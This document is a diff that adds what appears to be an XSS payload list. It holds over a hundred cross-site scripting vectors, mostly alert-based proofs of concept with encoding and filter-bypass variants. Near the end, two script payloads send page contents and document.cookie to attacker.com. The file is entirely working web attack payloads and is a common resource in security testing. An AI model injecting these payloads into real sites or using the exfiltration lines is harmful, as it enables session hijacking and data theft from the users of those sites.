@@ -1,0 +1,114 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+<img src=1 href=1 onerror="javascript:alert(1)">
+<body onload=alert(1)>
+<body onload=alert(document.domain)>
+<body onmouseover=alert(1)>
+<body onfocus=alert(1)>
+<input type=text onfocus=alert(1) autofocus>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<source onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<details ontoggle=alert(1) open>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert(document.domain)>
+<svg><script>alert(1)</script></svg>
+<svg><script xlink:href=data:,alert(1)></script></svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
+<math><mtext></title><script>alert(1)</script>
+<math><mi//xlink:href='data:x,<script>alert(1)</script>'>
+<table><td background="javascript:alert(1)">
+<link rel=import href="javascript:alert(1)">
+<object data=javascript:alert(1)>
+<object data="javascript:alert(1)">
+<embed src=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc=<script>alert(1)</script>>
+<iframe/src=jAvAsCript:alert(1)>
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<a onmouseover=alert(1)>hover</a>
+<a onmousedown=alert(1)>click</a>
+<button onclick=alert(1)>click</button>
+<button onmouseover=alert(1)>hover</button>
+<form action=javascript:alert(1)><input type=submit>
+<form onsubmit=alert(1)><input type=submit>
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:alert(document.domain)
+javascript:confirm(1)
+javascript:prompt(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+</script><script>alert(1)</script>
+--><script>alert(1)</script>
+]]><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</noscript><script>alert(1)</script>
+\"><script>alert(1)</script>
+\x3cscript\x3ealert(1)\x3c/script\x3e
+%3Cscript%3Ealert(1)%3C/script%3E
+%3cscript%3ealert(1)%3c/script%3e
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<sCrIpT>alert(1)</sCrIpT>
+<<script>alert(1)//<</script>
+<script>/**/alert(1)/**/</script>
+<script>al\u0065rt(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>a=alert;a(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>({}).constructor.constructor('alert(1)')()</script>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<img src=x onerror="javascript:alert(1)">
+<img src=x onerror=javascript:alert(1)>
+<img dynsrc="javascript:alert(1)">
+<img lowsrc="javascript:alert(1)">
+<img src=# onmouseover=alert(1)>
+<img src=# onclick=alert(1)>
+<marquee onstart=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<input type="image" src="javascript:alert(1)">
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>fetch('/').then(r=>r.text()).then(t=>fetch('https://attacker.com/?d='+btoa(t)))</script>
+<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
+<script>location='javascript:alert(1)'</script>
+<script>window.location='javascript:alert(1)'</script>
